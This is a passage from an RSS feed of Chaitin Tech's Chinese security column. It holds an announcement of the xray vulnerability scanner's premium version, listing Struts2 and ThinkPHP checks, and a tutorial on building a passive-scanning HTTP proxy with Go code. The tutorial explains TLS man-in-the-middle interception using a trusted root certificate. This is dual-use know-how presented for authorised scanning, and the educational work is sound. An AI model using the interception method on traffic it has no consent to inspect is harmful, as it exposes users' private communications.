data-actualsrc=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot;/&gt;&lt;/figure&gt;&lt;p&gt;对于已证明安全的密码学方案或技术方案，若实现不规范，亦有可能成为漏洞，造成严重后果。&lt;/p&gt;&lt;p&gt;长亭科技区块链安全组，在区块链安全技术方面已有相当的积累，拥有多个区块链相关的漏洞 CVE 编号，曾进行过大量的公链审计、智能合约审计项目，提供诸多企业级服务，为众多优秀的公链社区提供了建设性的意见。&lt;/p&gt;&lt;hr/&gt;&lt;blockquote&gt;&lt;b&gt;长亭科技安全服务&lt;/b&gt;&lt;br/&gt;&lt;b&gt;7*24小时守护您的安全！&lt;/b&gt;&lt;br/&gt;&lt;b&gt;邮箱：support@chaitin.com&lt;/b&gt;&lt;br/&gt;&lt;b&gt;应急响应热线：4000-327-707&lt;/b&gt;&lt;/blockquote&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-09-28-60064645</guid>
<pubDate>Sat, 28 Sep 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>长亭xray高级版强势发布</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-27-84486194.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/84486194&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9d63afb975b5674543a7d68f2f83c41d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;从8月到现在，短短一个月的时间，xray社区活跃人数又double啦！！！&lt;/p&gt;&lt;p&gt;xray不仅是漏洞检测工具和poc编写、运行工具，更是一个开放性的技术交流平台，是安全技术爱好者的大本营。高级版便是在原有社区版的基础上，充分吸纳使用者的反馈建议后，应运而生。 &lt;/p&gt;&lt;p&gt;相比于社区版，高级版都增加了哪些功能呢？小姐姐提前来点剧透，比如：Struts 2、ThinkPHP系列的检测插件、子域名收集、Web爬虫等等，其他更多功能敬请期待！！&lt;/p&gt;&lt;p&gt;先来了解一下这四个功能吧。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Struts 2&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;从2007年至今，已披漏的Struts相关漏洞数量近60个，而Struts 2作为世界上最流行的Java Web服务器框架之一，在金融、互联网等行业被大规模使用。xray作为精细化漏洞检测工具的代表，有针对性的处理了多种框架类应用。&lt;/p&gt;&lt;p&gt;xray安全研究团队对Struts 2漏洞的检测逻辑进行了深入研究，与其他漏洞检测工具相比，xray高级版请求数量更少、检测更加精准，安全指数更高，支持检测Struts2的OGNL表达式注入（涉及到s2-001、s2-013、s2-048、s2-053、s2-012、s2-014），devMode代码执行，s2-005、s2-015、s2-016、s2-032、s2-037、s2-045、s2-052、s2-057等高危漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Thinkphp&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Thinkphp是一个诞生十多年的老牌框架，在中国互联网圈里的使用也极为广泛，很多站长以及平台都在使用这套开源系统来建站。xray支持参数识别和处理后调用通用sql注入模块来检测Thinkphp的sql注入漏洞，同时还支持 `InvokeFunction` 和 `method` 系列远程代码执行漏洞的无害化检测。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;子域名收集&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;xray高级版子域名收集主要分为三个部分：DNS域传送检测、外部信息源收集子域名（持续增加并且随版本维护信息源）和子域名爆破。&lt;/p&gt;&lt;p&gt;特色功能：&lt;/p&gt;&lt;p&gt;1. 可选可视化交互Console UI，支持一键复制结果，一键保存文件；&lt;/p&gt;&lt;p&gt;2. 域名泛解析自动检查与智能规避泛解析；&lt;/p&gt;&lt;p&gt;3. 子域名递归爆破，层数可控；&lt;/p&gt;&lt;p&gt;4. 支持高并发（DNS查询并发），且并发数量可精准控制：在200的 DNS并发查询下，几十秒内可以完成对常见域名（非爆破）的检测；&lt;/p&gt;&lt;p&gt;5. 内置主字典3000余条，副字典160+条（用户检测多级域名）。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Web爬虫&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在xray 0.8.0版本中，我们加入了以爬虫方式触发的主动扫描，受到了很多社区朋友的认可，也收集了一些不足之处，因此我们计划投入核心精力加强Web 爬虫。&lt;/p&gt;&lt;p&gt;为了更适应专业用户的使用，为了打造专业的被动扫描引擎，为了打造专业的Web 爬虫，我们将合并现有社区版爬虫扫描与企业版中的部分智能化特性，与扫描引擎解耦，在高级版中作为独立的爬虫功能提供。这样我们可以方便的只使用 Web 爬虫进行业务资产清点，而不进行漏洞扫描，也可以给 Web 爬虫加代理实现原有的爬虫扫描功能。 &lt;/p&gt;&lt;p&gt;截止到目前，不少白帽子已经通过xray挖到了多家SRC的漏洞，同时，通过xray的poc编写、运行工具，社区白帽子可以在漏洞爆发后的第一时间输出poc供自己使用。&lt;/p&gt;&lt;p&gt;当然，这不是自吹自擂，而是来源于社区同学，不信你看。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f9ea277b8334026dd2638e407323e4cf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;253&quot; data-rawheight=&quot;210&quot; class=&quot;content_image&quot; width=&quot;253&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f9ea277b8334026dd2638e407323e4cf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;253&quot; data-rawheight=&quot;210&quot; class=&quot;content_image lazy&quot; width=&quot;253&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-f9ea277b8334026dd2638e407323e4cf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;759&quot; data-rawheight=&quot;250&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;759&quot; data-original=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;759&quot; data-rawheight=&quot;250&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;759&quot; data-original=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0bef3b58412668c5f37aa81cd1b5b473_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;xray 经过数个版本的更迭，基本覆盖了对常见漏洞的fuzzing, 稳定性和扫描效果上都有了很大的提高，但从宏观上来看，漏洞检测类的安全工具POC的质量和数量永远是一个不可绕过的鸿沟，个人乃至团队的力量在这件事面前显得微不足道。我们希望借助于大家的反馈，来对其进行持续的迭代优化，集结大家的力量壮大它的POC库，由此帮助xray更快、更好的成长。 &lt;/p&gt;&lt;p&gt;奖励措施：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;提交1个 POC 并被收录，可被邀请进入xray社区核心贡献者群，与 xray社区核心成员共同探讨，同时可获得xray社区版文化衫一件；&lt;/li&gt;&lt;li&gt;提交3个POC并被收录，可获得线下活动入场券，参与xray社区线下技术分享，同时获得Pwnhub社区邀请码；&lt;/li&gt;&lt;li&gt;提交5个POC并被收录，可获得 &lt;b&gt;xray高级版license&lt;/b&gt;，及更多不定期内部福利。&lt;/li&gt;&lt;/ol&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;xray项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/chaitin/xray&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/xray&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;官方QQ群：717365081&lt;/p&gt;&lt;p&gt;官方微信：添加微信号chanyo1016，加xray官方运营，会把大家拉到&lt;b&gt;xray官&lt;/b&gt;方微信群。&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2019-09-27-84486194</guid>
<pubDate>Fri, 27 Sep 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>HTTP被动扫描代理的那些事</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-16-82711934.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/82711934&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9d63afb975b5674543a7d68f2f83c41d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;HTTP 代理这个名词对于安全从业人员应该都是熟知的，我们常用的抓包工具 burp 就是通过配置 HTTP 代理来实现请求的截获修改等。然而国内对这一功能的原理类文章很少，有的甚至有错误。笔者在做 xray 被动代理时研究了一下这部分内容，并整理成了这篇文章，这篇文章我们从小白的角度粗略的聊聊 HTTP 代理到底是如何工作的，在实现被动扫描功能时有哪些细节需要注意以及如何科学的处理这些细节。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;开始之前我先来一波灵魂6问，读者可以先自行思考下，这些问题将是本文的关键点，并将在文章中一一解答：&lt;/p&gt;&lt;blockquote&gt;1.http_proxy 和 https_proxy 有什么区别?&lt;br/&gt;2.为什么需要信任证书才能扫描 HTTPS 的站点?&lt;br/&gt;3.代理 HTTPS 的站点一定需要信任证书吗?&lt;br/&gt;4.代理的隧道模式下如何区分是不是 TLS 的流量?&lt;br/&gt;5.代理应如何处理 Websocket 和 HTTP2 的流量?&lt;br/&gt;6.是否应该复用连接以及如何复用连接？&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;知识储备&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在本地做开发时，有时会需要启动一个 HTTPS 的服务，通常使用 OpenSSL 自行签发证书并在系统中信任该证书，然后就可以正常使用这个 TLS 服务了。如果没有信任，浏览器就会提示证书不信任而无法访问，简言之，我们需要手动信任自行签发的证书才可以正常访问配置了该证书的网站。那么问题来了，为什么平日访问的那些网站都不需要信任证书呢?打开 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; 查看其证书发现这里其实是一个证书链:&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;u&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;666&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;690&quot; data-original=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;666&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;690&quot; data-original=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/u&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;最顶层的 Global Sign RootCA 是一个根证书，第二个是一个中间证书，最后一个才是 baidu 的颁发证书，这三种证书的效力是:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;RootCA &amp;gt;  Intermediates CA &amp;gt; End-User Cert&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而且只要信任了 RootCA 由 RootCA 签发的包括其下级签发的证书都会被信任。而 Global Sign RootCA等是一些默认安装在系统和浏览器中的根证书。这些证书由一些权威机构来维护，可以确保证书的安全和有效性。而内置的这些根证书就允许我们访问一些公共的网站而无需手动信任证书了。&lt;/p&gt;&lt;p&gt;再来说下与 HTTP 代理相关的两个环境变量: HTTP_PROXY 和 HTTPS_PROXY，有的程序使用的是小写的，比如 curl。对于这两个变量，&lt;b&gt;约定俗称&lt;/b&gt;的规则如下:&lt;/p&gt;&lt;blockquote&gt;1.如果目标是 HTTP 的，则使用 HTTP_PROXY 中的地址&lt;br/&gt;2.如果目标是 HTTPS 的，则使用 HTTPS_PROXY 中的地址&lt;br/&gt;3.如果对应的环境变量为空，则不使用代理&lt;/blockquote&gt;&lt;p&gt;这两个环境变量的值是一个 URI，常见的有如下三种形式:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://127.0.0.1:7777

https://127.0.0.1:7777

socks5://127.0.0.1:7777&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;抛开与主题无关的 socks 不管，这里又有一个 http 和 https，别晕，这里的 http 和 https 指的是代理服务器的类型，类似 &lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://baidu.com&lt;/a&gt;&lt;/u&gt; 和 &lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//baidu.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://baidu.com&lt;/a&gt;&lt;/u&gt; 一个是裸的 HTTP 服务，一个套了一层 TLS 而已。那么组合一下就有 4 种情况了:&lt;/p&gt;&lt;blockquote&gt;1.http_proxy=&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//127.0.0.1%3A7777/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://127.0.0.1:7777&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;2.https_proxy=&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//127.0.0.1%3A7777/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://127.0.0.1:7777&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;3.http_proxy=&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//127.0.0.1%3A7777/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://127.0.0.1:7777&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;4.https_proxy=&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//127.0.0.1%3A7777/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://127.0.0.1:7777&lt;/a&gt;&lt;/u&gt;&lt;/blockquote&gt;&lt;p&gt;这四种情况都是合法的，也是代理实现时应该考虑的。但是如上面所说，这只是约定俗称的，没有哪个 RFC 规定必须这样做，导致上面四种情况在常见的工具中被实现的五花八门，为了避免把大家绕晕，我直接说结论：很多工具对后面两种不支持，比如 wget, python requests, 也就是说 https://还是被当成了 http://，因此我们这里只讨论前两种情况的实现。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;代理中的 MITM&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;HTTP 代理的协议基于 HTTP，因此 HTTP 代理本身就是一个 HTTP 的服务，而其工作原理本质上就是中间人（MITM) ，即读取当前客户端的 HTTP 请求，从代理发送出去并获得响应，然后将响应返回给客户端。其过程类似下面的流程:&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;u&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;219&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;690&quot; data-original=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;219&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;690&quot; data-original=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/u&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;为了更直观的感受下，可以用 nc 监听 127.0.0.1:7777 然后使用&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http_proxy=http://127.0.0.1:7777 curl http://example.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;会发现 nc 的数据包为:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;GET http://example.com/ HTTP/1.1
Host: example.com
Proxy-Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) 
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看起来和 HTTP 的请求非常像，唯一的区别就是 GET 后的是一个完整的 URI，而不是 path，这主要是方便代理得到客户端的原始请求，如果不用完整的 URI，请求的 Scheme 将无从得知，端口号有时也可能是不知道的。&lt;/p&gt;&lt;p&gt;在 Go 中我们可以用几行简单的代码实现这种场景下的代理。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;package main
import (
   &amp;#34;bufio&amp;#34;   
    &amp;#34;log&amp;#34;   
    &amp;#34;net&amp;#34;   
    &amp;#34;net/http&amp;#34;
)
var client = http.Client{}
func main() {
   listener, err := net.Listen(&amp;#34;tcp&amp;#34;, &amp;#34;127.0.0.1:7777&amp;#34;)
   if err != nil {
      log.Fatal(err)
   }
   for {
      conn, err := listener.Accept()
      if err != nil {
         log.Fatal(err)
      }
      go handleConn(conn)
   }
}
func handleConn(conn net.Conn) {
   // 读取代理中的请求   req, err := http.ReadRequest(bufio.NewReader(conn))
   if err != nil {
      log.Println(err)
      return   }
   req.RequestURI = &amp;#34;&amp;#34;   // 发送请求获取响应   resp, err := client.Do(req)
   if err != nil {
      log.Println(err)
      return   }
   // 将响应返还给客户端   _ = resp.Write(conn)
   _ = conn.Close()
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;编译运行这段代码，然后使用 curl 测试下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http_proxy=http://127.0.0.1:7777  curl -v http://example.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代理看起来工作正常，我们使用不到 40 行代码就实现了一个简易的 HTTP 代理！代码中的 req 就是做被动代理扫描需要用到的请求，把请求复制一份扔给扫描器就可以了。这也就是上面说的第一种情况， 即http_proxy=http://。那么如果直接使用上述实现访问 https 的站点会发生什么呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;TLS 与隧道代理&lt;/b&gt;&lt;/h2&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;https_proxy=http://127.0.0.1:7777 curl -v https://baidu.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用上面的方式访问 baidu 时，出现了比较奇怪的事情——通过代理读到的客户端请求不是原来的请求，而是一个 CONNECT 请求:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;CONNECT baidu.com:443 HTTP/1.1
Host: baidu.com:443
User-Agent: curl/7.54.0
Proxy-Connection: Keep-Alive&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是 HTTP 代理的另一种形式，称为隧道代理。隧道代理的过程如下:&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;u&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;239&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;690&quot; data-original=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;239&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;690&quot; data-original=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/u&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;隧道代理的出现是为了能在 HTTP 协议基础上传输非 HTTP 的内容。如果你用过 websocket，一定对 Connection: Upgrade 这个头不陌生。这个头是用来告诉 server，客户端想把当前的 HTTP 的连接转为 Websocket 协议通信的连接。类似的，这里的 CONNECT是一种协议转换的请求，但这种转换更像是一种 Degrade，因为握手完成后，这个链接将退化为原始的 Socket Connection，可以在其中传输任意数据。用文字描述下整个过程如下:&lt;/p&gt;&lt;blockquote&gt;1. 客户端想通过代理访问&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//baidu.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://baidu.com&lt;/a&gt;&lt;/u&gt;，向代理发送 Connect 请求。&lt;br/&gt;2. 代理尝试连接 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com%3A443&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com:443&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;，如果连接成功返回一个 200 响应，连接控制权转交个客户端；如果连接失败返回一个 502，连接中止。&lt;br/&gt;3. 客户端收到 200 后，在这个连接中进行 TLS 握手，握手成功后进行正常的 HTTP 传输。&lt;/blockquote&gt;&lt;p&gt;有个点需要注意下，转换后的连接是可以传输任意数据的，并非只是 HTTPS 流量，可以是普通的 HTTP流量，也可以是其他的应用层的协议流量。那么我们回到被动代理扫描这个话题，如何获取隧道代理中的请求并用来扫描？&lt;/p&gt;&lt;p&gt;这是一个比较棘手的问题，正是由于隧道中的流量可以是任意应用层协议的数据，我们无法确切知道隧道中流量用的哪种协议，所以只能猜一下。查看 TLS 的 RFC 可以发现，TLS 协议开始于一个字节 0×16，这个字节在协议中被称为 ClientHello，那么我们其实就可以根据这第一个字节将协议简单区分为 TLS 流量和非 TLS 流量。对于被动扫描器而言，为了简单起见，我们认为 TLS 的流量就是 HTTPS 流量，非 TLS 流量就是 HTTP 流量。后者和普通代理下的 MITM 一致，可以直接复用代码，而 HTTPS 的情况需要多一个 TLS 握手的过程。用伪代码表示就是:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;b = conn.Read(1)
if b == &amp;#34;0x16&amp;#34; {
	tlsHandShake(conn)
} 
req = readRequest(conn)
handleReq(conn, req)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里有个细节是读出的这一个字节不要忘记“塞回去”，因为少了一个字节，后面的会操作会失败。&lt;/p&gt;&lt;p&gt;这里我们需要重点关注下 TLS 握手过程。在 TLS 握手过程中会进行证书校验，如果客户端访问的是 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;，server 需要有 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; 这个域的公钥和私钥才能完成握手，可是我们手里哪能有 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;的证书（私钥），那个在文件在 baidu 的服务器上呢！&lt;/p&gt;&lt;p&gt;解决办法就是文章最开始说到的信任根证书。&lt;b&gt;信任根证书后，我们可以在 TLS 握手之前直接签发一个对应域的证书来进行 TLS 握手&lt;/b&gt;，这就是包括 burp 在内的所有需要截获 HTTPS 数据包的软件都需要信任一个根证书的原因！有了被系统信任的根证书，我们就可以签出任意的被客户系统信任的具体域的证书，然后就可以剥开 TLS 拿到被动扫描需要的请求了。这里还有一个小问题是签发的证书的域该使用哪个，简单起见我们可以直接使用 CONNECT 过程中的地址，更科学的方法我们后面说。签完证书就可以完成 TLS 握手，然后就又和第一节的情况类似了。&lt;/p&gt;&lt;p&gt;有个点需要提一下，如果不需要进行中间人获取客户端请求，是不需要信任证书的，因为这种情况下的是真正的隧道，像是客户端与服务器的直接通信，代理服务器仅仅在做二进制的数据转发。&lt;/p&gt;&lt;p&gt;至此，被动代理的核心实现已经完成了，接下来是一些琐碎的细节，这些细节同样值得注意。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;代理的认证&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;一个公网的代理如果没有加认证是比较危险的，因为代理本身就相当于开放了某个网络的使用权限，而且由于隧道模式的存在，代理的支持的协议理论上拓宽到了任何基于 TCP 的协议，如果可以和传统的 redis 未授权，SSRF DNS rebinding 等结合一下就是一个简单的 CTF 题。所以给代理加上鉴权是很有必要的。&lt;/p&gt;&lt;p&gt;代理的认证和正常的 HTTP Basic Auth 很像，只是相关头加了一个 Proxy- 的前缀，可以参考 《HTTP 权威指南》中的一个图学习一下:&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;u&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;484&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;484&quot; data-original=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img 